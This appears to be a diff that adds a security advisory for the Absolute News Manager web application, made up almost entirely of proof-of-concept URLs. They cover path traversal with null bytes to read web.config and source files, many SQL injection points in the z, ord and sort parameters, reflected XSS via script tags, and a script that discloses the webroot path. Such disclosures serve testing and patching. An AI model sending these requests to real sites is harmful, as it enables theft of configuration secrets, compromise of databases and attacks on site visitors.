@@ -1,0 +1,51 @@
+File retrieval PoC:
+http://www.example.com/[CustomerDefinedDir]/pages/default.aspx?a=1&amp;template=../web.config
+http://www.example.com/[CustomerDefinedDir]/pages/default.aspx?a=1&amp;template=default.aspx%00
+http://www.example.com/[CustomerDefinedDir]/pages/?a=1&amp;template=../anmviewer.ascx%00
+http://www.example.com/[CustomerDefinedDir]/pages/?a=1&amp;template=../default.aspx%00
+http://www.example.com/[CustomerDefinedDir]/pages/?a=1&amp;template=../PPL1HistoryTicker.aspx%00
+http://www.example.com/[CustomerDefinedDir]/pages/?a=1&amp;template=../xlagc.ascx%00
+http://www.example.com/[CustomerDefinedDir]/pages/?a=1&amp;template=../xlaabsolutenm.aspx%00
+http://www.example.com/[CustomerDefinedDir]/pages/?a=1&amp;template=../streamconfig.aspx%00
+http://www.example.com/[CustomerDefinedDir]/pages/?a=1&amp;template=../incSystem.aspx%00
+http://www.example.com/[CustomerDefinedDir]/pages/?a=1&amp;template=../articlefiles/r.asp%00
+http://www.example.com/[CustomerDefinedDir]/pages/?a=1&amp;template=../incSystem.aspx%00
+
+SQL injection PoCs:
+http://www.example.com/[CustomerDefinedDir]/xlaabsolutenm.aspx?z=@@version&amp;pz=9&amp;featured=n&amp;ord=desc&amp;sort=posted&amp;rmore=-&amp;
+http://www.example.com/[CustomerDefinedDir]/xlaabsolutenm.aspx?z=10&amp;ord=asc&amp;sort=headline&#039;INJECTED_PAYLOAD&amp;rmore=-&amp;
+http://www.example.com/[CustomerDefinedDir]/xlaabsolutenm.aspx?z=10&amp;ord=asc&#039;INJECTED_PAYLOAD&amp;sort=headline&amp;rmore=-&amp;
+http://www.example.com/[CustomerDefinedDir]/xlaabsolutenm.aspx?z=10&#039;INJECTED_PAYLOAD&amp;ord=asc&amp;sort=headline&amp;rmore=-&amp;
+http://www.example.com/[CustomerDefinedDir]/xlaabsolutenm.aspx?z=15&#039;INJECTED_PAYLOAD&amp;ss=y&amp;size=1.1em&amp;target=iframe&amp;
+http://www.example.com/[CustomerDefinedDir]/xlaabsolutenm.aspx?z=4&amp;pz=21&amp;ord=asc&amp;sort=headline&#039;INJECTED_PAYLOAD&amp;
+http://www.example.com/[CustomerDefinedDir]/xlaabsolutenm.aspx?z=4&amp;pz=21&amp;ord=asc&#039;INJECTED_PAYLOAD&amp;sort=headline&amp;
+http://www.example.com/[CustomerDefinedDir]/xlaabsolutenm.aspx?z=4&amp;pz=21&#039;INJECTED_PAYLOAD&amp;ord=asc&amp;sort=headline&amp;
+http://www.example.com/[CustomerDefinedDir]/xlaabsolutenm.aspx?z=4&#039;INJECTED_PAYLOAD&amp;pz=21&amp;ord=asc&amp;sort=headline&amp;
+http://www.example.com/[CustomerDefinedDir]/xlaabsolutenm.aspx?z=6&amp;ord=desc&amp;sort=posted&#039;INJECTED_PAYLOAD&amp;featured=n&amp;
+http://www.example.com/[CustomerDefinedDir]/xlaabsolutenm.aspx?z=6&amp;ord=desc&#039;INJECTED_PAYLOAD&amp;sort=posted&amp;featured=n&amp;
+http://www.example.com/[CustomerDefinedDir]/xlaabsolutenm.aspx?z=6&amp;pz=8&#039;INJECTED_PAYLOAD&amp;featured=only&amp;
+http://www.example.com/[CustomerDefinedDir]/xlaabsolutenm.aspx?z=6&amp;pz=9&amp;featured=n&amp;ord=desc&amp;sort=posted&#039;INJECTED_PAYLOAD&amp;rmore=-&amp;
+http://www.example.com/[CustomerDefinedDir]/xlaabsolutenm.aspx?z=6&amp;pz=9&amp;featured=n&amp;ord=desc&#039;INJECTED_PAYLOAD&amp;sort=posted&amp;rmore=-&amp;
+http://www.example.com/[CustomerDefinedDir]/xlaabsolutenm.aspx?z=6&amp;pz=9&#039;INJECTED_PAYLOAD&amp;featured=n&amp;ord=desc&amp;sort=posted&amp;rmore=-&amp;
+http://www.example.com/[CustomerDefinedDir]/xlaabsolutenm.aspx?z=6&#039;INJECTED_PAYLOAD&amp;ord=desc&amp;sort=posted&amp;featured=n&amp;
+http://www.example.com/[CustomerDefinedDir]/xlaabsolutenm.aspx?z=6&#039;INJECTED_PAYLOAD&amp;pz=8&amp;featured=only&amp;
+http://www.example.com/[CustomerDefinedDir]/xlaabsolutenm.aspx?z=6&#039;INJECTED_PAYLOAD&amp;pz=9&amp;featured=n&amp;ord=desc&amp;sort=posted&amp;rmore=-&amp;
+http://www.example.com/[CustomerDefinedDir]/xlaabsolutenm.aspx?z=7&amp;ord=desc&amp;sort=posted&#039;INJECTED_PAYLOAD&amp;
+http://www.example.com/[CustomerDefinedDir]/xlaabsolutenm.aspx?z=7&amp;ord=desc&#039;INJECTED_PAYLOAD&amp;sort=posted&amp;
+http://www.example.com/[CustomerDefinedDir]/xlaabsolutenm.aspx?z=7&#039;INJECTED_PAYLOAD&amp;ord=desc&amp;sort=posted&amp;
+
+
+XSS PoCs:
+http://www.example.com/[CustomerDefinedDir]/xlaabsolutenm.aspx?z=1,7&amp;sort=articleID&amp;ord=desc&amp;rmore=%3Cscript%3Ealert(1)%3C/script%3E&amp;size=2&amp;h=abc&amp;isframe=y
+http://www.example.com/[CustomerDefinedDir]/pages/?a=1&amp;template=%3Cscript%3Ealert(2)%3C/script%3E
+
+Webroot PoC:
+Requesting the &#039;getpath.aspx&#039; demo script discloses the physical path of the webroot - ie:
+http://www.example.com/[CustomerDefinedDir]/getpath.aspx
+
+	&quot;
+	Absolute News Manager Physical Path :
+	D:\inetpub\www.example.com\[CustomerDefinedDir]\
+
+	Please delete this file from your installation.
+	&quot;
